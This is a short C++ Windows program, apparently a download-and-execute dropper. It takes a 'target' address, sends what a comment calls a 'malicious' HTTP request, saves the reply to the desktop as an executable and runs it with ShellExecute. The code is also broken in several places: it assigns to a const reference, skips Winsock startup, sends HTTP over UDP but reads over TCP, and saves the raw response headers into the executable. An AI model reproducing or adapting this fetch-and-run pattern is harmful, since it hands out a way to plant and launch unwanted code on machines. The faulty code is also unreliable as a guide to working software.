#pragma comment (lib, "Ws2_32.lib")
#include <Windows.h>
#include <WinSock2.h>
#include <ws2tcpip.h>

#include <string>
#include <iostream>
#include <fstream>

bool resolve_address(sockaddr_in* address, const std::string& target)
{
    std::string port = "28960";
    auto pos = target.find_first_of(":");
    if (pos != std::string::npos)
    {
        port = target.substr(pos + 1);
        target = target.substr(0, pos);
    }

    addrinfo hints;
    addrinfo* result = NULL;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;

    if (getaddrinfo(target.data(), NULL, &hints, &result) != 0)
    {
        std::cout << "Failed to resolve address." << std::endl;
        return false;
    }

    *address = *(sockaddr_in*)result->ai_addr;
    address->sin_port = htons(static_cast<unsigned short>(atoi(port.data())));
    freeaddrinfo(result);

    return true;
}


bool read_address(sockaddr_in* address)
{
    std::string target;
    std::cout << "Enter the address of your target:" << std::endl;
    std::cin >> target;

    if (target.empty())
    {
        std::cout << "Invalid address." << std::endl;
        return false;
    }

    if (!resolve_address(address, target))
    {
        std::cout << "Failed to resolve address." << std::endl;
        return false;
    }

    return true;
}

std::string build_payload()
{
    // Construct an HTTP GET request to download the executable
    std::string data = "GET /path/to/executable.exe HTTP/1.1\r\n";
    data += "Host: www.example.com\r\n";
    data += "Connection: close\r\n";
    data += "\r\n";

    return data;
}

void receive_executable(const std::string& response, const std::string& pcName)
{
    // Assuming the server responds with the executable data in the response
    // You can save the executable data to a file on the desktop
    std::string filePath = "C:\\Users\\" + pcName + "\\Desktop\\downloaded_executable.exe";
    std::ofstream outfile(filePath, std::ofstream::binary);
    outfile.write(response.data(), static_cast<std::streamsize>(response.size()));
}

void send_to_address(const sockaddr_in& address, const std::string& data)
{
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET)
    {
        std::cout << "Failed to create socket." << std::endl;
        return;
    }

    if (sendto(sock, data.data(), static_cast<int>(data.size()), 0, reinterpret_cast<const SOCKADDR*>(&address), sizeof(address)) == SOCKET_ERROR)
    {
        std::cout << "Failed to send data." << std::endl;
    }

    closesocket(sock);
}

std::string receive_response(const sockaddr_in& address)
{
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET)
    {
        std::cout << "Failed to create socket." << std::endl;
        return "";
    }

    if (connect(sock, reinterpret_cast<const SOCKADDR*>(&address), sizeof(address)) == SOCKET_ERROR)
    {
        std::cout << "Failed to connect to the server." << std::endl;
        closesocket(sock);
        return "";
    }

    std::string response;
    char buffer[1024];
    int bytesReceived;

    do
    {
        bytesReceived = recv(sock, buffer, sizeof(buffer), 0);
        if (bytesReceived > 0)
        {
            response.append(buffer, bytesReceived);
        }
    } while (bytesReceived > 0);

    closesocket(sock);
    return response;
}

void execute_downloaded_executable(const std::string& pcName)
{
    std::string filePath = "C:\\Users\\" + pcName + "\\Desktop\\downloaded_executable.exe";

    // Use ShellExecute to execute the downloaded executable
    HINSTANCE hInstance = ShellExecuteA(NULL, "open", filePath.c_str(), NULL, NULL, SW_SHOWNORMAL);
    if (reinterpret_cast<int>(hInstance) > 32)
    {
        std::cout << "Executable executed successfully." << std::endl;
    }
    else
    {
        std::cout << "Failed to execute the downloaded executable." << std::endl;
    }
}

int main()
{
    char pcName[1024];
    DWORD size = sizeof(pcName);
    if (GetComputerNameA(pcName, &size) == 0)
    {
        std::cout << "Failed to get the PC name." << std::endl;
        return 1;
    }

    sockaddr_in address;
    if (!read_address(&address)) return 1;

    std::string payload = build_payload();

    // Send the malicious HTTP request
    send_to_address(address, payload);

    // Wait for the response
    std::string response = receive_response(address);

    // Process the received executable
    if (!response.empty())
    {
        receive_executable(response, pcName);
        std::cout << "Executable downloaded successfully." << std::endl;

        // Execute the downloaded executable
        execute_downloaded_executable(pcName);
    }
    else
    {
        std::cout << "Failed to download the executable." << std::endl;
    }

    WSACleanup();
    return 0;
}